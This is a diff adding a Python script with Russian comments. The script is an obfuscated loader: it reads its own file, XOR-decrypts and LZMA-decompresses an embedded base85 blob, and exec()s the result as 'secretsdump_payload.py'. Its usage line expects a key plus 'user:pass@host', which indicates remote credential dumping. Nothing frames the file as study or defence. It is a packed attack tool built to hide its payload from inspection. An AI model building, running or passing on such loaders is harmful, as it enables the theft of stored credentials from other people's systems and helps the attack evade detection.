@@ -1,0 +1,85 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import base64, lzma, sys, os
+
+# Читаем самого себя
+with open(__file__, 'r', encoding='utf-8') as _f:
+    _self = _f.read()
+
+# Извлекаем ключ и payload
+_parts = _self.split('---DELIMITER---', 1)
+if len(_parts) != 2:
+    sys.exit(1)
+
+_key_b64 = _parts[0].split('\n')[-1].strip()
+_payload_section = _parts[1].strip()
+
+# Извлекаем base85-строку из payload
+_marker = 'base64.b85decode("'
+_start = _payload_section.find(_marker) + len(_marker)
+_end = _start + _payload_section[_start:].find('"')
+_encrypted_b85 = _payload_section[_start:_end]
+
+# Дешифрация
+try:
+    _key = base64.b64decode(_key_b64)
+except Exception:
+    sys.exit(1)
+
+_encrypted = base64.b85decode(_encrypted_b85)
+
+def _xor(data, key):
+    out = bytearray(len(data))
+    klen = len(key)
+    for i in range(len(data)):
+        out[i] = data[i] ^ key[i % klen]
+    return bytes(out)
+
+_compressed = _xor(_encrypted, _key)
+_code = lzma.decompress(_compressed).decode('utf-8')
+
+# Прокидываем аргументы
+sys.argv = ["secretsdump_payload.py"] + sys.argv[1:]
+
+exec(compile(_code, "secretsdump_payload.py", "exec"))
+
+7TDcAOV38Bse0h6gLGssOWxOSb34YGZJRpUTd2Ci66U=
+---DELIMITER---
+import base64, lzma, sys, os
+
+if len(sys.argv) < 2:
+    print("[!] Usage: python fox.txt key.txt [user:pass@host]")
+    sys.exit(1)
+
+_key_arg = sys.argv[1]
+
+# sys.argv[1] может быть путём к key.txt или самим base64-ключом
+if os.path.isfile(_key_arg):
+    with open(_key_arg, "r") as _f:
+        _key_b64 = _f.read().strip()
+else:
+    _key_b64 = _key_arg
+
+try:
+    _key = base64.b64decode(_key_b64)
+except Exception:
+    print("[!] Invalid key")
+    sys.exit(1)
+
+_encrypted=base64.b85decode("5C^7MzjyE-_ynrvE^7@qa860R=&wG7rW{ge@BizOc6z(Gw@ZWeDuvNj0wH$8t=#AB+~?tJ5MYfgcBrYZ44-I<#xzR*Vnww_F(j+0?e1<>L?K<e=1_r>0N)bQ-~r3D8g`*&rZaPu%pl&HR70a0eu2ZQH}#u>jig07NB+DhTrXJeDBZUGGMyuiy|c;8x!_dQ+#2q5$0Rh*#N^QWKl3^lEcadd&k>b{fc>JeI4OByIu3Lf6s!G!Rqbv^RnN<|#cAf7l&bn2{kCjDwy`+NQ^XM-sX;+-ovadjj7t?M2CA$q)pz^&0wyI@PA0_uY`poyvwi&%%u1NW#%{+Y<GJ4~&h!=x`$QDFn*@Qb1A*KAe$y~(|Kbc~KRK5*qUuzqLJ4^s?p$x}j!77rB3wQMqj1|SypDrVb38XIB^if{&4i9hws)1n?+cfkFu8Jw0(#sNL>WM?T=Aa0eU=$&hs&<xTzXbOkpy<Jv;)Y1UmwqVxbewHDBUQeF81|dv^={)7LJ4^{mHukZuX~fhO`!mV7dZ6fqtekD@<{o3X<P@GriEssP1P$fAb_O6vl<kfOA{Atk&YH=#K{6LaRhxS&*z|U1xY0*H>j51Yo6y^^l0kFpQP5e*3*cUgqG921Ay_45e{GzH#g@2BBN;R@m;_NeORKx0Pj{o^YYpGHdm$O|kL6!-OcpFEXK_hE37^HVaD;!$EZ<IDAV_!7B0b-ntpo1-67HNh?kr=R_bQ+5?5nPn3(<@#px!uBEhFYjQtKAOZYNkt$I3)2UYuqRZ!>NG77%w8nx}Bs`cGN7o<dnXoOZ6Rd){^SVGSq5C}v&7>(@JV)hLQn{`cMe@Vjw|*UBI1b$EN;o4Wvc$)Yp6<+9^koFnKj|TJWz~nZsXf`r=X`*#@&kTR{ZowpM|hy28jP6#aE};_gC`i&E<5eo8_Q6oE>8Z3s$ziM{<kI1R%9}`Kj!=bA;+8p920-xAov?6EK)f__N1zC6kO?>|2HwVC3E<j;KzkoUZahFbTl%|X&=~h@Rtan3PIhOBp5L$Yn7Y8Z(nW$djNyb7#Yu&7}27v1(1x_)e@Eh5O%;Q@KI;;yPdh6W#bN-(>~@>6FEuy{V5O92Hg1?&C1L(kic&z-aFi^{P|Sm58qL^@>!I;O?2RQei6}^BaaF*Z&jC~jA+bwl}|;Wso1tY0<np6Y4+N<2A!~kfq9)haZV6TUi%mN8=LPP(a}qqEfjX24sV<Vh|IXEs7tyIH_9ffb{QehBgOaj6Wsje*31i7pPU!vXxo9|=A`ypIeE?Mo0{g>TD&<JF8vIBiT`%HzW+6Qg7f)jG?w7KLg|Lqr9aFg{1TE=A=G&P<dg!(8Nuz#cYb;Cmm$AWLdxwX9)Npm+4#Yu-XhDoXn;wdijnus0<_r>3rvJQ*k~D=Br_#o3K>IKVOc?c5dYhKh%o4yL~m6@EGS`o7-h2)jr{a@-1{!9uk&^0cZdc|Ot?&eOuQ0mP*`QT#Sv$g5@nT|X5bs14j{qO*QLqhnn4t+sN7RExy^+&VnZ-x%>L`CG`BMv>@K)k8cA_e^c~DKTT*7=Z~#)#_$NhXE>jU{qMx}DdkG(#?as=m5qr~Q*N$b`CCX)!ljiO?<;SQN$M%YSJJcR9Meb!jZu$S!7lQyBIynQymLuA_UXg&YNpLG$9A~T*I;HNUB!rP-Ue2W3Ala#@B<`<v2(?S;(;KfnA~b+|ZaG>@e}uRVxqf>Srmd_Y$W8GwlBw`94dC7fB%GtmDhDop`TWv=*;5#G-;`O?;SgFhkOy8JSd8E8$K*gwT6$zKZgd9N07N3IcDDIdby;nY$`(JlUfs^+MF^dHh%Gm@sj)_rKcjW*<q<iF437xkb+khS@LWIdQ5lN!p?lJe?ObSs?z_r~_Fxs!`T0dO_{3Gt#>3?HU#lU6H!cl)MP$}*`v4R^Pm(2VYMm~royBp8s9L}0vdCCSEmu<^@F#Eb?wA!&?0S=mM!+!JP3-#ELUF6odwo;ti)oohk)0)?>8DX-V$Frx{l$#=kjb!xCns(b2bry9t?)mN(qwH;@>%DVSzQh38;&Nsxm<`MpmKV|7m*!yv_W5wZnhB#wm}}NQq}yEWrbw}2;IOOTJE=yj6#1MX5}W<M!E#3N2N{9y9J8Z6%l0XS7v8#(2zNrZ41#zThI0{z&kA%+EqfN-j5dfE<NQVfX(?-Wwr@OVFYNZ%`4+-D}VDt*&?~zJIV6$y?|pYZ`_m7(-?)**GzK)Vi#j0KBPR<#X0rB$rV<tFjFSnif#{e&tu6`1P@tID~N@DBhOr0Q@36_GrizE6%ekuWsQ@N5+IP|Si|hARBo**=6ujPIQB}#InP#|teCWN$#yXKPmOIXY26pfTG7g<V{FNcDVQe6S9D4i!sKm7r<JKO`QRZo?}bM)E@JhA%)AU6c#1^`2b6)})F~D+$6-^6Q~O{l3#R12LZ`tCV?l7Rbc^$zI&<XR11y1Q3o_}SSw$T!G(|y1v?mN3w>LS3cI1(yxM1K6stWa(3q7)Y3tqN|1T~4r0A0WOE9uQJp*n%vPyx*fovYfVCLlqcP@qdz<1wQ|*cj>O_FcU&s`PLQDZ&<0cl)y?Pv+2oQ%)J<4;L)DN?H@dWGpl8ic;_^%*h!J**LD!9WVfEt&WeNR=n>{Cql591Pe6r)9tU%{&!B)G1Dcqh;Lmh(zRMu9xK>PAeGh)<`SO!=-@1jk->_(>zUVda=EBsY7Xnn?|<<|pE8t982evRT6BS%Zlix4Lxggsqa#JSp|RVP(&DEm127nb?`wxXg#N<1Mi^%DX#xxezrfN?Lh)d&cYxi3Zji-f0O66#9->c6>d|kcJ=39>Ny>C&G_@0fUY>gG8o~x@l^`!$m~QcB1N><YUK@<YBq_<~K*qT8a_@tFGXjs$!w+J^zG^6++@ek7uN>ZQCai8;#s%FTLiEP#sxb+(LssG_rYWMbB#KbIX$x&0D4G#@r5qRPs@KS5{e%_@0n96)++sXl$#(2(bt`ZPJk;#*iSp$cI%1$!|EfgBT4jw>`yk7i(2lF@uq}tNsl1dSPb<NMYK<2u88Qm@F?F^?@XR1og=O<-umq8zNrE3q?C%93Op;>C4qkph>3NMq{Q*haU~SRj_}GL6tvlnPNzAR}jxyC~!e|mDfN%5|l!QD=(3U7gl9FoVJ<>{9+><)^#kByjMc+NDlq%fg+rHKtD*o1Qtw7*4h;V7Mwwx+zP=Xm*0)}sT?kL6?ATL~<Fwt0SZ4YJ94Sj@>E451(#D#;d$wKNzJnQZZSv{DwpD5UU^XGlUBmJhaxl`2!uW0&bEE-x4Yc@$8r3e5>iu<<YvW*stodR$zjUg$rkxCNhpHuEjOIV0z*x41Oymk5&iJbkE*e>6}J#91!5G^RBzC+$(({A8&yyzVhPdWz-`~$k6{<1@Ek)?dh&)IgF-_qb&%y#2L&8gHw(K<}^4%m?Lg8^T5u<&aEE95NfjxSwh{Za2>G8uGrG5w@`QIiQg9!q<4JQ{l04L^HYB~<n<-!G|I-kx^?DW|ty;q&J-ee%X`!t)#kuCdU?&J3AQ)Zc3(w77hZKQ)dzW~<7xS_84`JavRS9IPb74uHdeLCWAf3tFjQF>04lny@2S*jLn)hCr1;Z_ITs4BvWiHT{-3NZ>u;eTJ{$-rygkEh}4moR_}Ov;R(RzNG7~FH4;I-?_h{K<`DL3_bzLCiVP!fg)P0E^`~QSvVs>Frz1%A!J|Tmevg@MNtQ>8Vrx;D;FaLvq$u4{~~;V0iLKD`)zR?r~7>u4qD9sh{$L;Y&9?+14-a~FoXG=<_xU9XD>6BI)!nQfLrT;NOU>CMh$=Fsy8-NX-MXUy@vf`K*2JiH-sqdEs+I{{`5AO2mzfhlc~%`oO96_Vbd+niCcOuFiVIQ%fhF;RaYxOR4Y*LztCH3htemNy|PPRU{s&d=>CJoBxGkE$03+Z9$Ezh<8RTRWfW*4ZeK_I8(4Ciiq$d5zI}(t4}?E>lw41R;rr_2iSV$i-n?L@?%QD$dG{WPpd;YsWgrMo+|m2IyIw&HLo8C*z`OdbXSo@t1)qG%ag~9`j_W8Gs+|I=q3B%=ZU4TL*p{H~LbMAstSRxXtQ3u?OfyWqDEqf^jn!D5Anr$GkXG9k(I5i5v1x$T4;1Vg4Qoj8FHqGb39Qv3V67{-272{P+l5pob6IzDK-9&JUevH(upZV5wYwZIDyQCe1{-DE8QzFiDY~|1UG&o5oK%DKd~yPAJ8xyY;26w-W%Msk&LU!SD=;N&ku^~|8Ul1a5mW}?><NQ`!f2h@C~wvK2@Jp(7rx~1#2jGKhC54549LQoEm1t9NC+*S-ipZx=7X2x>J7taYpmZ0rf5O-Xm3{)QbdI(=qJ}2Byvu(uCbdh@nghZj)FHHmVFr}>_e|Frwnnn6J$sUIS;jIu5hQhv!f-2&=^O~zU$;J*~btrJ7_A15WR}k8L0n)JIT-&0?#q5Wv}}|IL{Y$po$4szZrf<{^=OQKuu%iCunWU-xh&~j9Pv$$LlzuizQsMvvP#xk$VsQ!&FyO!n+@(&G7I9D-<8~2{0yiFXQPO@QYhM1UT-?px_x^@7EQ-Uzd;6&F{QLKx=#L(GPGwluQw>urEZp{TM_w?vEX190P8jxa5>Au_+)+LXPfY##0PUG~)8e7*uNAgNc<Q!_OdAssqdU>wf3{UKdPZ5CSjz(30!MuNbyHpP%kRE~amg_Jw+_i}T!jL-58;F8CYmgkP7ucW58@;`h!QQO}<?{YXfJFc#{VW|!C5S6_U~#ON8n+YE@BsSsUMz?$+Cez8rxv%1gm68LQhXP~NQ44hK_o0lJ!hJSclC6bKey%nKMYD%=+5Lr7*e;lUezb%>JYKIAOWNDZ&2ej~CKO7RfQ!>5gnB$qXEoiDRgH+~1%)x??idbjDVa92W6=j<DohM=<VZkaiMppoXHxtk2D3Fn;eU=DlOFg2_5z$_7_UzLL1PaI+K63vZP}XUkv4wClt}oqj{pNA*VMCVsU>e<<Z$!DNG_g52#aJyPML%t+-HsuSH^v37r)-?w{BusCap#Q5c)9C96DVO4M+OVBUy{)ICP@5#+L{)TCftY$2fB$tKQixVPAhh%u}0k;tg?v8VRmZQhG-QjauDAzD|~B1J{+=bI)>FK{|2BefYzQM3>><0i@IZlFLIDFbHu&sO(L28?BL+k%aB3aN)PhYL>ROVBmNZ%agn3jX+LVwde4##J2YlKR9~Z}_XT0@%(!K65uIBBg54OnOyS>|>j=%z#x1`*bd_|VIQc-GXL>h@OBLr0F_2q|g#RT<;`uW!^g+CY)^FZ=I<Sd{o=mEGo_5f3+1Hy+3b#!j*KeO1YC&{=F^x+Tio#p}(z~kdYpQiuJ~EfkDWb4hpXhVKcD^nG{9JeqFJ@o^5<nWjd5R!@i44(f0?9%`7m%#|eBzqT@jNDfHwY(j_yuZF&O;GPagel4+^nz<c;7tJc<~pvaBH%x^-@}YPMf2g4tX3-uO=OOfC_E!A!;B!(PerH{o`SC(+WR4CR|O-pI0dYCPCjIt;&&Lp;9zqz%d0Z=CTWCt6a7FHROpBll(i|DaYJQ5~%pngzy`AKUWM}1gys<(UGN#AXVQ+EHPsK_01&`$<wnOX45RRoRfT4%b!x6+@f0;`%oXr3f=it3sv9Re+axJDS+yF=;De?ao+Eyw}p+1YJKZ+E+8e^_XgF7;&6)UNdI)3fE&XfY)gN7nmCbDz$09ix2%R&P_n%OrU6pUrh156ytJ)l*_6!No{uCQ#%y4a+%h>*aA2ZCIsIqoJ@^g0d&g(m?1HSD1j?E1ti7T-zb0u{RQ%7;K8PvGSNQ8tLKHkNA<2;9OOqs0G=52?W8TmXZ)iLQQD0*`q>LoGWli=bf3*bBVC1FY5j+hzU86ZJIsR6#AWrqhfXjblt1<&SW%L!WBnFDRa1uz$QSSD6bw+k4Cb<*LN)e-Rv5U@_UchVTv&~qfT&JW+7AmHNn#(|z9c0=ZJjKrQPO;&kK({JwaHU|lhMJ@C?!v?#SjUiu%VO@dr=F`3zg_r5?<t%R-~l*1g)mS19*IA)9GBDgACTSk!QiRT4Ek^+Zr);8)527(a3@(jeTdU^?U)4~<EC#f$reZ`_TEjg<zTntyt*#tN1=|up*`8R9XTz*{QiHd=*zaaV)N;Qvr!x}){E(@G7A7zEz!x(ws4QWz*@1Wpatz_6HUF$dAr(kZhbr_m_Honau5B=8uG5VX=8Q%-^rAdPJdMel<`3=QyU^X;*;;qP2s=C1i(GgfO-Ce#*J0FtwU=;6NSOZQUI)lcTso_OV5hFX^o7utHQ<u)|xaE7!8fHG1SEUT_32CRAjz(CI^g)LC83jD#1_E$o`rFgz1?7uTKC`px^(8*VP|mk1;$u!)s^$v6v`#b+kfwJ6AdACL5G$eDGOC)Bwzvw8t}+=*m2=WVb(D!oXUceWxbJ5Si*%XQwR4TL9Bs^Lzf0nc8zCAEkE$Z*d;=OB5!Cm17v1(>YU?1I=mhbio74$>CdNJj7>!5;Eqh2eYXRgEou>$Ra^@F*sO-X|@V%(Yr)_LzvP<4&wh^8Rj@4GTCB=Ru-cYQYzm*1_6gWl1l&}=*ZQ#c5W8YX%n1vk<8I*_$wf=HpJ6gb-oBLng2)<%*RMcEbc1!N-0-8Jjin`B_aFa!QdyHP*B)RU?wm0aYcTB8S(R(|8%vDB_3g*GUfX@m^QI|k#i{5{Rgy>Sr;ZTIMW--I9=Ve=i4VBf|dht$}K{U?UQ4Gg1<jy&U&VtaPVN8vWgzmbCMk6H7`=!z(n=gNDNS}Uch^fEhQ-4<z5@RidgS_?AMm|CB(F1kx(+Y)i^V6QSAb|?V=xsQ!$PLCWie!-_^+i=(4sRx=zW#KQW_Wu@eac4yA~_8Lo$aJ;v$}G3@YrG>0JGc^J~PZ1`G){F>w;{xqX$RnTASSL5uirEL!>UlygXe06up>i9&u(&>#e%QeX)AKD0g9W9N|qq`vrJ!Qe#)13|DgUILoJHd@*DFeiXNU@b8(HS$(rP3`|s4t4AOgx_l{!AX~g<aaYFNhxCv8+G^)|N2U`+0T=pvPS8pSGEh&V}j<;F37ilsGl*2PDc5c&q^WCExOzEgoV{z5aP4q7-kw%`i2tJR0x8`UuL(^}aGMgy4-pQ233K=!B1k$gHu3f>JuKBtzSC1MUPl20Bk(X^=Ll^V!LBhDSD~H0^<v@*6l9t~J!GC7IN{NM0xRa%V6PPEdezl^(J*=K>=!0`<B5;+#0PTqt3SIuT_vW=i&@zm@yYAQ^hEWQL}9SsQUktLDSsLu|I783d|O&C?ZNe$Kvxs5^S$<XhW&D1+SCdjj1h;g(mCh$@Ps#2lOeI9+Mkqn<9j4nx?+vpnX*aC+ubHuo<Yks|a3s0v1$$7rRM4$qiuv>mbC&r$Vsu!rwbGbI}MUba3pwZcU_8L2v`Tb2k~6HM(%Rb~$E_Tj?C(W%NWz=lmk;n{Nb+MW~Sw*B@vBh$`;`R0V@A1<S7szUFA`ELotF$fpD{y0)VPWcbdGPbB_Lp42Xxjpynz(rfRO_;Zp@?l0;i~l{*h1wQVFuMkl2Qd2<bQrRch0jHy!>=zv3un=1?AEfn=KkuhI^C10%=vEC-sL?Cra^hk;%^Au@=4sdo3Wt+S9jqDb`W`#c&lg**M8|3gcIUT1UB4~5Qq5m!%Ssu!Vm!XfUqNzX$h(kLZiylI~Nh;|G*&EYfb$u0~nE@NZ-c(0x;2mOKxAlOLS*(T@`U&Mm0V{LZ#(Z0nqw|9$DjUc2`w7pD=@;&321}PvzZs&6_We<L=cSQPEsWM0=>gDq>rS_@dhyDk;lUDfmHfxvjAU7)v5pAPTVZiy6+&IF6;-*+_mZP@|;cH-C@z1_*}q5LSbC#|nIJ+c#V!?cLX^{=v{u9&sdP?RSVi^#G`j92v6^XXtebEId{~99$w!b8=-7m<ggP&i`D4L>LxX#B(pX-^xnVgW8Ap=F+3(;RmfT7LQ-J9t$^if6ibv^GiNikHp=yN;*`;yQqPNOl+ShDjP*u#QSPU)1v+eA4LtwYl<*s69$dxjo9;z#?upps_ZGVOKg-gZ{EnAYwXE$eG~M9b>nS-OiGe>7gWxQ$6OkZ_sUlF4`nCPrQrmxj{Z5<^bq+x`sQoICtAX*^45MuTDDVcI-EY(MQ_EPIC}rwp+Fj`Vm=whA>MonK}{k$SGG!uFsiz&HmYToVKZ0DLAFH2Z};2&Efl~F>E|z@LLZvmUp13{B#12JM}!6>0f0d=`vo~>JWuOWCwjjo^2zH$yM9|-Zn+b4Nbg*bwKRGY(%^3-%|=p#Fu^g$E1FE+CgteGAoq{uLFTOgg?hf()j7?j`5v?(G4~mz@(Qw}0y3YvlPEuE(6k#S^Vwleu02;lNl&sYsqO0rg8tHvMLP|%km@T=*{0(%4t+C<tppJLc%4vZYxE<}#{_~1GD+1L4~-?iu2h`zo?QVc8AAkhtB|z(F0lB%R{3^+7N5f!mB)A&7IMpsQONyA`0<iQxu^zyPpT&b?Fn*Bo>+5`I3jX|cUM-t!&popkSgEju5m@~um1NGq#(3z6xHiZTKN1vgF3?=stl0V?RdyG@oNDvFqt*bh&C!;M$5DP+Zlha0XQ;<UNLR{cR_Xn5lag0;IRGL?9F-P!}{bIgbk9kr%G3MkG>chWEb5bcgX4(2!H6DF7VY<92pIFkgIKpWNxG<&$sZuOxj7AQN64z;}i|arfI50ldMneFvoPJLCs16o~%Z>p@JT&6KfYeHU$Q%dZOcz`nv0~-Z|&8U6yE;i!kq(kER#UtE`IDL()+08fOm7d(sYJU3yAc`B**I;Rr)AfEh?0&3AMg-gkQq@reb7dQizW7*XC(C0*xy`>ERiXA%Z*9DdM`!ZtUJT_ILcPrIhvy8wQR-|N$h3KDgx$-ftRSlg){#K0~7tzvLyLk`U0raDX$8$w{L^&K6)h0pxrAW<f)1NOWg;%?&DJQii~AT$H!P=@0n$a^BP2yC89kr#x@mT<PTb1n_pW3F^a^my}O7UzBDpzB%N>uOOn`LaY@B6!KyioK!hOmY&&e#PfcT>6|8Ojc(O%^CghLBG|592N6pVjzA4lKEq&E#c2*M4QV5)&qaH`Ff4Kx*qrm6j(DFd4i=0C<sr@5c3zdDi+bIDhdxO%9(A%4rh(M=PPJZ>EJnVjAh#2gxoZ08WOT~ASqw);NMaP>^>YznO9p|D#Rjx%!2)a=k_2;xIe?dczQX2vWJ)T8|8I~pl^P0tn`7Yxl$~y7{IaxzwMezE2g#71=0o<-KS_YU0>WR578X3GN}gnPfwA|a62(Za*|{rfI@#x^S5HvH|F64DT}OebndNs)MDzymZHjF!gsF?o2EESeooO5w}?1k!VW&YEE5<h?^Zd67MiJ$m>E28uxg&j<v@hWZOvt<x7%?Cy03HM`O09PMW%huG`|oHyhfaIfv&=0-}IM>o4c1<*C5;P<l;%J)+fQSiQ?Y)@pve#{DBQzdvu;96@*$n>VsL|iLzqIlwKwJLMN@!1F`#=^#75Jhz|E=?kegjl8Wwx62K0p44ih4bxIV=QftuXWHO!3b^kWi;mMAZxo-(6S1FWAO-UB(-_rxLq{14TnVKbqE?YJnPNTim$H04it)jjt%?K#70Ks=4(!o-#A<XpJvhwf7a-agpAa*(^$Uc;W<6sad+)C&+?XBe=$ua@G0&vTabbvX+sm!bhD#q-)tn@<>^{KxvzM#x-f_c^uHGMXb5!|C(hV|bvw>P!EH<;%>#mo8FOd{gh?>z~wOCv>+4!XsGt5xwg2Cp7p_QC+qjewxK6LQi$KUt0FL9bJ&k7eHm(Wg;LK~PI#0**xZ4-PBcrkv6FdZ&(}(p9CaObl#4I1QIUk^A-?RJ<1EXPG{*CgXRyecIe<E!+$u=tAAT5C`+hw>-CToqt_yg{F;TWu;0Z3NAfSP3kbC>xZ6|ll9HS7@_Wm_|;ObWATNJO0Lp!JwSxdUIt6i<&7>gt5|&k6zKPOV#UJbMU4QC&|OuyS4E;I6-qUAGbQ?Df^j9`c5LND_#W+h!_l~WEBMgm43ojlrPUzNhyBrakl#uOM)s>S?i&4`+-!!@-{#OU=>Igt32&&DC0H8P6gvrS>GV1`1_sF~xms&RZA+f4@5)f$$c4nsqRgcRB#@<#HX=ExN-Gv}QR=(jwRw?#Rl)~yIdBiTq3%4k17M4WWU7;#SMn=*1Tz(xPnfwZ<U$8KlCrsgW*e`$lc2#+N~oZ5$vVA<p7J#cRM=Ag+#JEx<U=2ijRIq0V37;IrAi!*f@kZ|w5X?JjKbwTxN?$KJM}}oQRIvWs}DtTM1k?wR9q|iOj9g5yYTBU{u&|sMwGZnqA=;D+XBXeRI``h9MT@3EN^vV")
+
+def _xor(data, key):
+    out = bytearray(len(data))
+    klen = len(key)
+    for i in range(len(data)):
+        out[i] = data[i] ^ key[i % klen]
+    return bytes(out)
+
+_compressed = _xor(_encrypted, _key)
+_code       = lzma.decompress(_compressed).decode("utf-8")
+
+# Прокидываем ВСЕ оставшиеся аргументы (sys.argv[2:]) в payload.
+# payload сам разберёт что target, что launcher_path через _is_target()
+sys.argv = ["secretsdump_payload.py"] + sys.argv[2:]
+
+exec(compile(_code, "secretsdump_payload.py", "exec"))
